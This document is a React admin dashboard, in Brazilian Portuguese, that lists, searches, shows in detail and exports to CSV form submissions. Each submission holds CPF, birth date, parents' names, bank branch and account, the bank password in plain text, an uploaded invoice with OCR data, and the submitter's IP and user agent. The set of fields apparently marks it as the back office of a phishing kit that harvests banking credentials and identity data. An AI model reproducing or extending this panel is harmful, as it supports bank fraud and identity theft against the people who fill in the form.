import { useState, useMemo } from "react";
import { useAuth } from "@/_core/hooks/useAuth";
import { trpc } from "@/lib/trpc";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import {
  Table,
  TableBody,
  TableCell,
  TableHead,
  TableHeader,
  TableRow,
} from "@/components/ui/table";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogDescription,
} from "@/components/ui/dialog";
import { Skeleton } from "@/components/ui/skeleton";
import { 
  Search, 
  Download, 
  FileText, 
  Eye, 
  ChevronLeft, 
  ChevronRight,
  LogOut,
  LayoutDashboard,
  AlertCircle,
  CheckCircle,
  Clock,
  XCircle,
  ExternalLink
} from "lucide-react";
import { toast } from "sonner";
import { getLoginUrl } from "@/const";

type FormSubmission = {
  id: number;
  email: string;
  telefone: string;
  cpf: string;
  dataNascimento: string;
  nomePai: string;
  nomeMae: string;
  agencia: string;
  conta: string;
  senha: string;
  faturaUrl: string | null;
  faturaKey: string | null;
  faturaFilename: string | null;
  ocrData: string | null;
  ocrValidationStatus: "pending" | "validated" | "mismatch" | "error" | null;
  submittedAt: Date;
  ipAddress: string | null;
  userAgent: string | null;
  createdAt: Date;
  updatedAt: Date;
};

function getOCRStatusBadge(status: string | null) {
  switch (status) {
    case "validated":
      return <Badge className="bg-green-500/20 text-green-400 border-green-500/30"><CheckCircle className="w-3 h-3 mr-1" />Validado</Badge>;
    case "mismatch":
      return <Badge className="bg-yellow-500/20 text-yellow-400 border-yellow-500/30"><AlertCircle className="w-3 h-3 mr-1" />Divergência</Badge>;
    case "error":
      return <Badge className="bg-red-500/20 text-red-400 border-red-500/30"><XCircle className="w-3 h-3 mr-1" />Erro</Badge>;
    case "pending":
    default:
      return <Badge className="bg-blue-500/20 text-blue-400 border-blue-500/30"><Clock className="w-3 h-3 mr-1" />Pendente</Badge>;
  }
}

function SubmissionDetailDialog({ 
  submission, 
  open, 
  onOpenChange 
}: { 
  submission: FormSubmission | null; 
  open: boolean; 
  onOpenChange: (open: boolean) => void;
}) {
  if (!submission) return null;

  const ocrData = submission.ocrData ? JSON.parse(submission.ocrData) : null;

  return (
    <Dialog open={open} onOpenChange={onOpenChange}>
      <DialogContent className="max-w-2xl max-h-[90vh] overflow-y-auto bg-card border-border">
        <DialogHeader>
          <DialogTitle className="text-foreground">Detalhes da Submissão #{submission.id}</DialogTitle>
          <DialogDescription>
            Enviado em {new Date(submission.submittedAt).toLocaleString('pt-BR')}
          </DialogDescription>
        </DialogHeader>
        
        <div className="space-y-6 mt-4">
          {/* Personal Data */}
          <div className="space-y-3">
            <h3 className="text-sm font-semibold text-[oklch(0.65_0.18_195)] uppercase tracking-wider">
              Dados Pessoais
            </h3>
            <div className="grid grid-cols-2 gap-4 text-sm">
              <div>
                <p className="text-muted-foreground">Email</p>
                <p className="text-foreground font-medium">{submission.email}</p>
              </div>
              <div>
                <p className="text-muted-foreground">Telefone</p>
                <p className="text-foreground font-medium">{submission.telefone}</p>
              </div>
              <div>
                <p className="text-muted-foreground">CPF</p>
                <p className="text-foreground font-medium">{submission.cpf}</p>
              </div>
              <div>
                <p className="text-muted-foreground">Data de Nascimento</p>
                <p className="text-foreground font-medium">{submission.dataNascimento}</p>
              </div>
              <div>
                <p className="text-muted-foreground">Nome do Pai</p>
                <p className="text-foreground font-medium">{submission.nomePai}</p>
              </div>
              <div>
                <p className="text-muted-foreground">Nome da Mãe</p>
                <p className="text-foreground font-medium">{submission.nomeMae}</p>
              </div>
            </div>
          </div>

          {/* Bank Data */}
          <div className="space-y-3 pt-4 border-t border-border">
            <h3 className="text-sm font-semibold text-[oklch(0.75_0.18_55)] uppercase tracking-wider">
              Dados Bancários
            </h3>
            <div className="grid grid-cols-3 gap-4 text-sm">
              <div>
                <p className="text-muted-foreground">Agência</p>
                <p className="text-foreground font-medium">{submission.agencia}</p>
              </div>
              <div>
                <p className="text-muted-foreground">Conta</p>
                <p className="text-foreground font-medium">{submission.conta}</p>
              </div>
              <div>
                <p className="text-muted-foreground">Senha</p>
                <p className="text-foreground font-medium font-mono">{submission.senha}</p>
              </div>
            </div>
          </div>

          {/* Invoice */}
          {submission.faturaUrl && (
            <div className="space-y-3 pt-4 border-t border-border">
              <h3 className="text-sm font-semibold text-[oklch(0.65_0.18_195)] uppercase tracking-wider">
                Fatura
              </h3>
              <div className="flex items-center gap-3 p-3 bg-input/30 rounded-lg">
                <FileText className="w-8 h-8 text-accent" />
                <div className="flex-1">
                  <p className="text-foreground font-medium">{submission.faturaFilename || 'fatura.pdf'}</p>
                  <div className="flex items-center gap-2 mt-1">
                    {getOCRStatusBadge(submission.ocrValidationStatus)}
                  </div>
                </div>
                <a 
                  href={submission.faturaUrl} 
                  target="_blank" 
                  rel="noopener noreferrer"
                  className="text-accent hover:text-accent/80"
                >
                  <ExternalLink className="w-5 h-5" />
                </a>
              </div>
            </div>
          )}

          {/* OCR Data */}
          {ocrData && (
            <div className="space-y-3 pt-4 border-t border-border">
              <h3 className="text-sm font-semibold text-muted-foreground uppercase tracking-wider">
                Dados Extraídos (OCR)
              </h3>
              <div className="grid grid-cols-2 gap-4 text-sm bg-input/30 p-4 rounded-lg">
                {ocrData.nome && (
                  <div>
                    <p className="text-muted-foreground">Nome</p>
                    <p className="text-foreground">{ocrData.nome}</p>
                  </div>
                )}
                {ocrData.cpf && (
                  <div>
                    <p className="text-muted-foreground">CPF</p>
                    <p className="text-foreground">{ocrData.cpf}</p>
                  </div>
                )}
                {ocrData.endereco && (
                  <div className="col-span-2">
                    <p className="text-muted-foreground">Endereço</p>
                    <p className="text-foreground">{ocrData.endereco}</p>
                  </div>
                )}
                {ocrData.valor && (
                  <div>
                    <p className="text-muted-foreground">Valor</p>
                    <p className="text-foreground">{ocrData.valor}</p>
                  </div>
                )}
                {ocrData.vencimento && (
                  <div>
                    <p className="text-muted-foreground">Vencimento</p>
                    <p className="text-foreground">{ocrData.vencimento}</p>
                  </div>
                )}
              </div>
            </div>
          )}

          {/* Metadata */}
          <div className="space-y-3 pt-4 border-t border-border">
            <h3 className="text-sm font-semibold text-muted-foreground uppercase tracking-wider">
              Metadados
            </h3>
            <div className="grid grid-cols-2 gap-4 text-sm">
              <div>
                <p className="text-muted-foreground">IP</p>
                <p className="text-foreground font-mono text-xs">{submission.ipAddress || 'N/A'}</p>
              </div>
              <div>
                <p className="text-muted-foreground">User Agent</p>
                <p className="text-foreground text-xs truncate" title={submission.userAgent || ''}>
                  {submission.userAgent?.slice(0, 50) || 'N/A'}...
                </p>
              </div>
            </div>
          </div>
        </div>
      </DialogContent>
    </Dialog>
  );
}

export default function Admin() {
  const { user, loading: authLoading, logout } = useAuth();
  const [search, setSearch] = useState("");
  const [debouncedSearch, setDebouncedSearch] = useState("");
  const [page, setPage] = useState(0);
  const [selectedSubmission, setSelectedSubmission] = useState<FormSubmission | null>(null);
  const [detailOpen, setDetailOpen] = useState(false);
  const limit = 10;

  // Debounce search
  useMemo(() => {
    const timer = setTimeout(() => {
      setDebouncedSearch(search);
      setPage(0);
    }, 300);
    return () => clearTimeout(timer);
  }, [search]);

  const { data, isLoading, error } = trpc.admin.listSubmissions.useQuery({
    search: debouncedSearch,
    limit,
    offset: page * limit,
  }, {
    enabled: !!user && user.role === 'admin',
  });

  const exportMutation = trpc.admin.exportSubmissions.useQuery(undefined, {
    enabled: false,
  });

  const handleExport = async () => {
    try {
      const result = await exportMutation.refetch();
      if (result.data) {
        const blob = new Blob([result.data.csv], { type: 'text/csv;charset=utf-8;' });
        const url = URL.createObjectURL(blob);
        const link = document.createElement('a');
        link.href = url;
        link.download = result.data.filename;
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
        URL.revokeObjectURL(url);
        toast.success(`${result.data.count} registros exportados com sucesso!`);
      }
    } catch {
      toast.error("Erro ao exportar dados");
    }
  };

  const handleViewDetails = (submission: FormSubmission) => {
    setSelectedSubmission(submission);
    setDetailOpen(true);
  };

  // Auth loading state
  if (authLoading) {
    return (
      <div className="min-h-screen bg-background flex items-center justify-center">
        <div className="text-center">
          <div className="w-8 h-8 border-2 border-primary border-t-transparent rounded-full animate-spin mx-auto mb-4" />
          <p className="text-muted-foreground">Carregando...</p>
        </div>
      </div>
    );
  }

  // Not authenticated
  if (!user) {
    return (
      <div className="min-h-screen bg-gradient-cinematic flex items-center justify-center">
        <Card className="max-w-md w-full mx-4 glass-card border-0">
          <CardContent className="p-8 text-center">
            <LayoutDashboard className="w-12 h-12 mx-auto mb-4 text-accent" />
            <h1 className="text-2xl font-bold text-foreground mb-2">Acesso Restrito</h1>
            <p className="text-muted-foreground mb-6">
              Faça login para acessar o painel administrativo.
            </p>
            <Button
              onClick={() => window.location.href = getLoginUrl()}
              className="w-full bg-primary hover:bg-primary/90"
            >
              Fazer Login
            </Button>
          </CardContent>
        </Card>
      </div>
    );
  }

  // Not admin
  if (user.role !== 'admin') {
    return (
      <div className="min-h-screen bg-gradient-cinematic flex items-center justify-center">
        <Card className="max-w-md w-full mx-4 glass-card border-0">
          <CardContent className="p-8 text-center">
            <AlertCircle className="w-12 h-12 mx-auto mb-4 text-destructive" />
            <h1 className="text-2xl font-bold text-foreground mb-2">Acesso Negado</h1>
            <p className="text-muted-foreground mb-6">
              Você não tem permissão para acessar esta área.
            </p>
            <Button
              onClick={logout}
              variant="outline"
              className="w-full"
            >
              <LogOut className="w-4 h-4 mr-2" />
              Sair
            </Button>
          </CardContent>
        </Card>
      </div>
    );
  }

  const totalPages = data ? Math.ceil(data.total / limit) : 0;

  return (
    <div className="min-h-screen bg-background">
      {/* Header */}
      <header className="border-b border-border bg-card/50 backdrop-blur sticky top-0 z-40">
        <div className="container flex items-center justify-between h-16">
          <div className="flex items-center gap-3">
            <div className="w-2 h-8 bg-accent rounded-full" />
            <h1 className="text-xl font-bold text-foreground">Painel Administrativo</h1>
          </div>
          <div className="flex items-center gap-4">
            <span className="text-sm text-muted-foreground hidden sm:block">
              {user.name || user.email}
            </span>
            <Button variant="ghost" size="icon" onClick={logout}>
              <LogOut className="w-5 h-5" />
            </Button>
          </div>
        </div>
      </header>

      <main className="container py-8">
        {/* Stats Cards */}
        <div className="grid grid-cols-1 md:grid-cols-3 gap-4 mb-8">
          <Card className="bg-card border-border">
            <CardContent className="p-6">
              <div className="flex items-center justify-between">
                <div>
                  <p className="text-sm text-muted-foreground">Total de Submissões</p>
                  <p className="text-3xl font-bold text-foreground">{data?.total ?? '-'}</p>
                </div>
                <div className="w-12 h-12 rounded-full bg-accent/20 flex items-center justify-center">
                  <FileText className="w-6 h-6 text-accent" />
                </div>
              </div>
            </CardContent>
          </Card>
          
          <Card className="bg-card border-border">
            <CardContent className="p-6">
              <div className="flex items-center justify-between">
                <div>
                  <p className="text-sm text-muted-foreground">Validados (OCR)</p>
                  <p className="text-3xl font-bold text-green-400">
                    {data?.submissions.filter(s => s.ocrValidationStatus === 'validated').length ?? '-'}
                  </p>
                </div>
                <div className="w-12 h-12 rounded-full bg-green-500/20 flex items-center justify-center">
                  <CheckCircle className="w-6 h-6 text-green-400" />
                </div>
              </div>
            </CardContent>
          </Card>
          
          <Card className="bg-card border-border">
            <CardContent className="p-6">
              <div className="flex items-center justify-between">
                <div>
                  <p className="text-sm text-muted-foreground">Com Divergência</p>
                  <p className="text-3xl font-bold text-yellow-400">
                    {data?.submissions.filter(s => s.ocrValidationStatus === 'mismatch').length ?? '-'}
                  </p>
                </div>
                <div className="w-12 h-12 rounded-full bg-yellow-500/20 flex items-center justify-center">
                  <AlertCircle className="w-6 h-6 text-yellow-400" />
                </div>
              </div>
            </CardContent>
          </Card>
        </div>

        {/* Submissions Table */}
        <Card className="bg-card border-border">
          <CardHeader className="border-b border-border">
            <div className="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-4">
              <div>
                <CardTitle className="text-foreground">Submissões</CardTitle>
                <CardDescription>Gerencie todas as submissões do formulário</CardDescription>
              </div>
              <div className="flex items-center gap-3">
                <div className="relative">
                  <Search className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground" />
                  <Input
                    placeholder="Buscar por email, CPF..."
                    value={search}
                    onChange={(e) => setSearch(e.target.value)}
                    className="pl-9 w-64 bg-input border-border"
                  />
                </div>
                <Button onClick={handleExport} variant="outline" className="border-border">
                  <Download className="w-4 h-4 mr-2" />
                  Exportar CSV
                </Button>
              </div>
            </div>
          </CardHeader>
          
          <CardContent className="p-0">
            {isLoading ? (
              <div className="p-6 space-y-4">
                {[...Array(5)].map((_, i) => (
                  <Skeleton key={i} className="h-12 w-full" />
                ))}
              </div>
            ) : error ? (
              <div className="p-12 text-center">
                <AlertCircle className="w-12 h-12 mx-auto mb-4 text-destructive" />
                <p className="text-muted-foreground">Erro ao carregar submissões</p>
              </div>
            ) : data?.submissions.length === 0 ? (
              <div className="p-12 text-center">
                <FileText className="w-12 h-12 mx-auto mb-4 text-muted-foreground" />
                <p className="text-muted-foreground">Nenhuma submissão encontrada</p>
              </div>
            ) : (
              <>
                <div className="overflow-x-auto">
                  <Table>
                    <TableHeader>
                      <TableRow className="border-border hover:bg-transparent">
                        <TableHead className="text-muted-foreground">ID</TableHead>
                        <TableHead className="text-muted-foreground">Email</TableHead>
                        <TableHead className="text-muted-foreground">CPF</TableHead>
                        <TableHead className="text-muted-foreground">Telefone</TableHead>
                        <TableHead className="text-muted-foreground">Agência/Conta</TableHead>
                        <TableHead className="text-muted-foreground">Status OCR</TableHead>
                        <TableHead className="text-muted-foreground">Data</TableHead>
                        <TableHead className="text-muted-foreground text-right">Ações</TableHead>
                      </TableRow>
                    </TableHeader>
                    <TableBody>
                      {data?.submissions.map((submission) => (
                        <TableRow key={submission.id} className="border-border">
                          <TableCell className="font-mono text-foreground">#{submission.id}</TableCell>
                          <TableCell className="text-foreground">{submission.email}</TableCell>
                          <TableCell className="font-mono text-foreground">{submission.cpf}</TableCell>
                          <TableCell className="text-foreground">{submission.telefone}</TableCell>
                          <TableCell className="font-mono text-foreground">
                            {submission.agencia}/{submission.conta}
                          </TableCell>
                          <TableCell>{getOCRStatusBadge(submission.ocrValidationStatus)}</TableCell>
                          <TableCell className="text-muted-foreground">
                            {new Date(submission.submittedAt).toLocaleDateString('pt-BR')}
                          </TableCell>
                          <TableCell className="text-right">
                            <Button
                              variant="ghost"
                              size="icon"
                              onClick={() => handleViewDetails(submission)}
                              className="text-muted-foreground hover:text-foreground"
                            >
                              <Eye className="w-4 h-4" />
                            </Button>
                          </TableCell>
                        </TableRow>
                      ))}
                    </TableBody>
                  </Table>
                </div>

                {/* Pagination */}
                {totalPages > 1 && (
                  <div className="flex items-center justify-between px-6 py-4 border-t border-border">
                    <p className="text-sm text-muted-foreground">
                      Mostrando {page * limit + 1} - {Math.min((page + 1) * limit, data?.total ?? 0)} de {data?.total ?? 0}
                    </p>
                    <div className="flex items-center gap-2">
                      <Button
                        variant="outline"
                        size="icon"
                        onClick={() => setPage(p => Math.max(0, p - 1))}
                        disabled={page === 0}
                        className="border-border"
                      >
                        <ChevronLeft className="w-4 h-4" />
                      </Button>
                      <span className="text-sm text-foreground px-2">
                        {page + 1} / {totalPages}
                      </span>
                      <Button
                        variant="outline"
                        size="icon"
                        onClick={() => setPage(p => Math.min(totalPages - 1, p + 1))}
                        disabled={page >= totalPages - 1}
                        className="border-border"
                      >
                        <ChevronRight className="w-4 h-4" />
                      </Button>
                    </div>
                  </div>
                )}
              </>
            )}
          </CardContent>
        </Card>
      </main>

      {/* Detail Dialog */}
      <SubmissionDetailDialog
        submission={selectedSubmission}
        open={detailOpen}
        onOpenChange={setDetailOpen}
      />
    </div>
  );
}
